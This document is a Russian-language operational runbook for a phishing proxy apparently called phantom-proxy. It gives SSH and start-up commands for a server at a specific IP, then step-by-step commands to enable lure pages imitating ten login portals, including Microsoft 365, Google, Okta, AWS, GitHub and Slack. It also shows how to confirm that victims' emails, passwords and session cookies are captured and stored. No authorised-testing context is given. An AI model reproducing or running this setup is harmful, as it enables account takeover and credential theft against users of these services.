# 🎣 ЗАПУСК ВСЕХ ФИШЛЕТОВ - ПОШАГОВАЯ ИНСТРУКЦИЯ

**Версия:** 1.0  
**Домен:** verdebudget.ru

---

## 🚀 ПОДГОТОВКА

### 1. Подключение к серверу

```bash
ssh -i "C:\Users\Administrator\.ssh\vk-cloud.pem" ubuntu@212.233.93.147
```

### 2. Запуск всех сервисов

```bash
cd ~/phantom-proxy

# Остановка старых
pkill -f 'python.*\\.py'

# Запуск API
nohup python3 api.py > api.log 2>&1 &

# Запуск HTTPS Proxy
nohup python3 https.py > https.log 2>&1 &

# Запуск Panel
cd panel && nohup python3 server.py > ../panel.log 2>&1 &
cd ..

sleep 5

# Проверка
curl http://localhost:8080/health && echo ' ✅ API'
curl -sk https://localhost:8443/ -w ' HTTPS: %{http_code}\\n' -o /dev/null
```

---

## 📋 ЗАПУСК ФИШЛЕТОВ ПО ОЧЕРЕДИ

### Фишлет #1: Microsoft 365

**URL для проверки:**
```
https://212.233.93.147:8443/microsoft
```

**Ожидаешь:**
- ✅ Логотип Microsoft
- ✅ Форма входа (email + password)
- ✅ Стиль Microsoft 365
- ✅ При вводе данных → сохранение → редирект на настоящий Microsoft

**Команды:**
```bash
phantom> phishlets enable o365
phantom> lures create o365
phantom> lures get-url 0
```

---

### Фишлет #2: Google Workspace

**URL для проверки:**
```
https://212.233.93.147:8443/google
```

**Ожидаешь:**
- ✅ Логотип Google
- ✅ Форма входа (email + password)
- ✅ Стиль Google Accounts
- ✅ Кнопка "Далее"

**Команды:**
```bash
phantom> phishlets enable google
phantom> lures create google
phantom> lures get-url 1
```

---

### Фишлет #3: Okta SSO

**URL для проверки:**
```
https://212.233.93.147:8443/okta
```

**Ожидаешь:**
- ✅ Логотип Okta
- ✅ Форма входа
- ✅ Стиль Okta SSO

**Команды:**
```bash
phantom> phishlets enable okta
phantom> lures create okta
phantom> lures get-url 2
```

---

### Фишлет #4: AWS Console

**URL для проверки:**
```
https://212.233.93.147:8443/aws
```

**Ожидаешь:**
- ✅ Логотип AWS
- ✅ Форма входа
- ✅ Стиль AWS Console

**Команды:**
```bash
phantom> phishlets enable aws
phantom> lures create aws
phantom> lures get-url 3
```

---

### Фишлет #5: GitHub

**URL для проверки:**
```
https://212.233.93.147:8443/github
```

**Ожидаешь:**
- ✅ Логотип GitHub
- ✅ Форма входа
- ✅ Стиль GitHub

**Команды:**
```bash
phantom> phishlets enable github
phantom> lures create github
phantom> lures get-url 4
```

---

### Фишлет #6: LinkedIn

**URL для проверки:**
```
https://212.233.93.147:8443/linkedin
```

**Ожидаешь:**
- ✅ Логотип LinkedIn
- ✅ Форма входа
- ✅ Стиль LinkedIn

**Команды:**
```bash
phantom> phishlets enable linkedin
phantom> lures create linkedin
phantom> lures get-url 5
```

---

### Фишлет #7: Dropbox

**URL для проверки:**
```
https://212.233.93.147:8443/dropbox
```

**Ожидаешь:**
- ✅ Логотип Dropbox
- ✅ Форма входа
- ✅ Стиль Dropbox

**Команды:**
```bash
phantom> phishlets enable dropbox
phantom> lures create dropbox
phantom> lures get-url 6
```

---

### Фишлет #8: Slack

**URL для проверки:**
```
https://212.233.93.147:8443/slack
```

**Ожидаешь:**
- ✅ Логотип Slack
- ✅ Форма входа
- ✅ Стиль Slack

**Команды:**
```bash
phantom> phishlets enable slack
phantom> lures create slack
phantom> lures get-url 7
```

---

### Фишлет #9: Zoom

**URL для проверки:**
```
https://212.233.93.147:8443/zoom
```

**Ожидаешь:**
- ✅ Логотип Zoom
- ✅ Форма входа
- ✅ Стиль Zoom

**Команды:**
```bash
phantom> phishlets enable zoom
phantom> lures create zoom
phantom> lures get-url 8
```

---

### Фишлет #10: Salesforce

**URL для проверки:**
```
https://212.233.93.147:8443/salesforce
```

**Ожидаешь:**
- ✅ Логотип Salesforce
- ✅ Форма входа
- ✅ Стиль Salesforce

**Команды:**
```bash
phantom> phishlets enable salesforce
phantom> lures create salesforce
phantom> lures get-url 9
```

---

## 📊 ТАБЛИЦА ДЛЯ ПРОВЕРКИ

Заполни после проверки:

| # | Сервис | URL | Статус | Примечания |
|---|--------|-----|--------|------------|
| 1 | Microsoft 365 | https://212.233.93.147:8443/microsoft | ✅ / ❌ | |
| 2 | Google Workspace | https://212.233.93.147:8443/google | ✅ / ❌ | |
| 3 | Okta SSO | https://212.233.93.147:8443/okta | ✅ / ❌ | |
| 4 | AWS Console | https://212.233.93.147:8443/aws | ✅ / ❌ | |
| 5 | GitHub | https://212.233.93.147:8443/github | ✅ / ❌ | |
| 6 | LinkedIn | https://212.233.93.147:8443/linkedin | ✅ / ❌ | |
| 7 | Dropbox | https://212.233.93.147:8443/dropbox | ✅ / ❌ | |
| 8 | Slack | https://212.233.93.147:8443/slack | ✅ / ❌ | |
| 9 | Zoom | https://212.233.93.147:8443/zoom | ✅ / ❌ | |
| 10 | Salesforce | https://212.233.93.147:8443/salesforce | ✅ / ❌ | |

---

## 🧪 ПРОВЕРКА СОХРАНЕНИЯ ДАННЫХ

### Тест для каждого фишлета:

**1. Открой URL фишлета**

**2. Введи тестовые данные:**
```
Email: test@example.com
Password: TestPassword123!
```

**3. Нажми "Войти" / "Далее"**

**4. Проверь сохранение:**
```bash
phantom> sessions

  ID  Email                    Service          Captured            Status
  1   test@example.com         Microsoft 365    2026-02-19 12:00    ✅
```

**5. Детали сессии:**
```bash
phantom> sessions 1

  Email:        test@example.com
  Password:     TestPassword123!
  Service:      Microsoft 365
  Cookies:      {...}
```

---

## 🐛 ВОЗМОЖНЫЕ ПРОБЛЕМЫ

### Проблема 1: Страница не открывается

**Решение:**
```bash
# Проверь сервисы
curl http://localhost:8080/health
curl -sk https://localhost:8443/

# Перезапуск
pkill -f 'python.*\\.py'
cd ~/phantom-proxy
nohup python3 api.py > api.log 2>&1 &
nohup python3 https.py > https.log 2>&1 &
```

### Проблема 2: Данные не сохраняются

**Решение:**
```bash
# Проверь БД
sqlite3 phantom.db "SELECT * FROM sessions;"

# Проверь логи
tail -f api.log
```

### Проблема 3: Стиль не отображается

**Решение:**
- Проверь что шаблоны в папке `templates/`
- Проверь что пути к CSS правильные
- Проверь консоль браузера (F12)

---

## 📝 ОТСЧЁТ ПО ТЕСТИРОВАНИЮ

**Дата:** _______________

**Тестировал:** _______________

**Результаты:**

| Сервис | Страница открывается? | Стиль правильный? | Данные сохраняются? |
|--------|----------------------|-------------------|---------------------|
| Microsoft 365 | ✅ / ❌ | ✅ / ❌ | ✅ / ❌ |
| Google | ✅ / ❌ | ✅ / ❌ | ✅ / ❌ |
| Okta | ✅ / ❌ | ✅ / ❌ | ✅ / ❌ |
| AWS | ✅ / ❌ | ✅ / ❌ | ✅ / ❌ |
| GitHub | ✅ / ❌ | ✅ / ❌ | ✅ / ❌ |
| LinkedIn | ✅ / ❌ | ✅ / ❌ | ✅ / ❌ |
| Dropbox | ✅ / ❌ | ✅ / ❌ | ✅ / ❌ |
| Slack | ✅ / ❌ | ✅ / ❌ | ✅ / ❌ |
| Zoom | ✅ / ❌ | ✅ / ❌ | ✅ / ❌ |
| Salesforce | ✅ / ❌ | ✅ / ❌ | ✅ / ❌ |

**Итого:** ___ / 30 тестов пройдено

**Общий статус:** ✅ УСПЕШНО / ❌ ТРЕБУЕТСЯ ИСПРАВЛЕНИЕ

**Комментарии:**
```
_________________________________
_________________________________
_________________________________
```

---

**ГОТОВО К ТЕСТИРОВАНИЮ!** 🚀

**Начни с Microsoft 365:** https://212.233.93.147:8443/microsoft

**Отправь мне скриншот каждой страницы!**
